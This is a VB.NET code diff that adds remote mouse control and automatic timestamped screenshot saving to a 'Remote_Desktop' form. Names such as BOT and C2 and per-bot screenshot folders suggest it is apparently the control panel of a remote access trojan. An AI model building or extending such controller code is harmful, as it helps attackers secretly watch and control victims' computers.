@@ -6,6 +6,7 @@ Public Class Remote_Desktop
     Public Sz As Size
     Public C2 As Integer = 10
     Public SPL = S_Settings.SPL
+    Public BOT As String
 
 
 
@@ -78,6 +79,50 @@ Public Class Remote_Desktop
         Catch ex As Exception
         End Try
     End Function
+
+    Private Sub P1_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles P1.MouseDown
+        If CHKmouse.Checked = True Then
+            Dim PP = New Point(e.X * (Sz.Width / P1.Width), e.Y * (Sz.Height / P1.Height))
+            Dim but As Integer
+            If e.Button = Windows.Forms.MouseButtons.Left Then
+                but = 2
+            End If
+            If e.Button = Windows.Forms.MouseButtons.Right Then
+                but = 8
+            End If
+            M.S.Send(U, "#" & M.SPL & PP.X & M.SPL & PP.Y & M.SPL & but)
+        End If
+    End Sub
+
+    Private Sub P1_MouseUp(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles P1.MouseUp
+        If CHKmouse.Checked = True Then
+            Dim PP = New Point(e.X * (Sz.Width / P1.Width), e.Y * (Sz.Height / P1.Height))
+            Dim but As Integer
+            If e.Button = Windows.Forms.MouseButtons.Left Then
+                but = 4
+            End If
+            If e.Button = Windows.Forms.MouseButtons.Right Then
+                but = 16
+            End If
+            M.S.Send(U, "#" & M.SPL & PP.X & M.SPL & PP.Y & M.SPL & but)
+        End If
+
+    End Sub
+
+    Dim op As New Point(1, 1)
+    Private Sub P1_MouseMove(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles P1.MouseMove
+        If CHKmouse.Checked = True Then
+            If MetroButton1.Text = "Stop" Then
+                Dim PP = New Point(e.X * (Sz.Width / P1.Width), e.Y * (Sz.Height / P1.Height))
+                If PP <> op Then
+                    op = PP
+
+                End If
+
+            End If
+        End If
+    End Sub
+
     Private Sub MetroButton1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MetroButton1.Click
         Try
             If MetroButton1.Text = "Start" Then
@@ -98,11 +143,7 @@ Public Class Remote_Desktop
 
     Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MetroButton2.Click
         Try
-            Dim s As New SaveFileDialog
-            s.Filter = "Pic|*.png"
-            If s.ShowDialog = Windows.Forms.DialogResult.OK Then
-                P1.Image.Save(s.FileName)
-            End If
+            P1.Image.Save(uFolder(BOT + "/RDP", DateTime.Now.ToString("yyyy MM dd HH mm ss") + ".jpeg"))
         Catch ex As Exception
             MsgBox(ex.Message)
         End Try
@@ -117,5 +158,7 @@ Public Class Remote_Desktop
             Me.Close()
         End If
     End Sub
+
+
 
 End Class
